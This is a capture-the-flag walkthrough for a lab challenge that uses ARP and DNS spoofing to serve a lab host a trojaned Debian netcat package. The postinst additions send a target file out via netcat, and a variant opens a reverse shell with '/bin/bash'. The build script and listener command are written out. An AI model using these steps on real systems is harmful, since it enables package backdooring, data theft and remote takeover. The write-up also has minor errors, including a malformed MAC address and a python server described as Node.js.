# Objective 9: ARP Shenanigans
Location: NetWars

The objective is to get hold of the file `/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt` on a remote host using ARP  and DNS spoofing.

Exercise setup:
||Local Host|Remote Host  |Spoofed Host|
|--|--|--|--|
|MAC|02:42:0a:06:00:02  | 4c:24:57ab:ed:84 ||
|IP| 10.6.0.2 | 10.6.6.35 |10.6.6.53|

A [Python Scapy script](https://github.com/joergschwarzwaelder/hhc2020/blob/master/Objective-9/spoof.py) was prepared to spoof ARP replies for the spoofed host redirecting the traffic to the local host.
Furthermore this script spoofs DNS replies for queries sent to the spoofed host and does always return A records pointing to it's own local IP address.
The script takes the IP address of the spoofed host as argument, so here is has to be called with `./spoof.py 10.6.6.53`.

Capture of ARP and DNS spoofing with following HTTP request:
```
17:27:16.968588 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
17:27:16.992764 ARP, Reply 10.6.6.53 is-at 02:42:0a:06:00:02, length 28
17:27:17.009009 IP 10.6.6.35.16498 > 10.6.6.53.53: 0+ A? ftp.osuosl.org. (32)
17:27:17.029673 IP 10.6.6.53.53 > 10.6.6.35.16498: 0*- 1/0/0 A 10.6.0.2 (62)
17:27:18.098422 IP 10.6.6.35.50340 > 10.6.0.2.80: Flags [S], seq 2451495177, win 64240, options [mss 1460,sackOK,TS val 2516141758 ecr 0,nop,wscale 7], length 0
17:27:18.098452 IP 10.6.0.2.80 > 10.6.6.35.50340: Flags [R.], seq 0, ack 2451495178, win 0, length 0
```

A Node.js HTTP server was started from the home directory using  `python3 -m http.server 80` and it logged the request:

    10.6.6.35 - - [12/Dec/2020 17:37:02] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 404 -

On the local host the Debian package `netcat-traditional_1.10-41.1ubuntu1_amd64.deb` was found.
This package was modified to include a netcat command in the postinst script to send the text file to our local host:

`/bin/nc 10.6.0.2 4444 < /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt`

By opting for 
`/bin/nc 10.6.0.2 4444 -e /bin/bash`
an interactive reverse shell can be acquired.

The snippet below automatically inserts the correct IP address of the local host and places the package in the right location of the web tree:
```
cd ~/debs
mkdir tmp
dpkg-deb -R netcat-traditional_1.10-41.1ubuntu1_amd64.deb tmp
echo /bin/nc `ifconfig eth0 | grep 'inet ' | awk '{print $2}'`' 4444 < /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt' >> tmp/DEBIAN/postinst
mkdir -p ../pub/jfrost/backdoor
dpkg-deb -b tmp ../pub/jfrost/backdoor/suriv_amd64.deb

```
That way the remote device would download this package and install it. In course of the installation, the file in scope would be sent to port 4444 of the local host, which has to run the command

    nc -lvp 4444 > text
to receive the [text](https://github.com/joergschwarzwaelder/hhc2020/blob/master/Objective-9/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt) (resp. receive the reverse shell connection).
In this file it can be found that **Tanta Kringle** recused herself from the vote.
<!--stackedit_data:
eyJoaXN0b3J5IjpbNzk3MzQxOTIyLDI2ODY1MzQ4NCwxMjcyNj
U2NDE5LDg1ODE4ODkyOSwxMDkyNzg1MzIxLC0yMDYyNjc1Mjk3
LC02MTI4OTc3OTksLTg1MjcyMjcwMywxNzU4MjQzNjc3LDE2Mz
QzOTQ5NDEsMTIwNDQyNjUzOSwtMTc5ODQxNTg5NiwtODc4Mzky
MjE2LDUxNDIwOTE1OV19
-->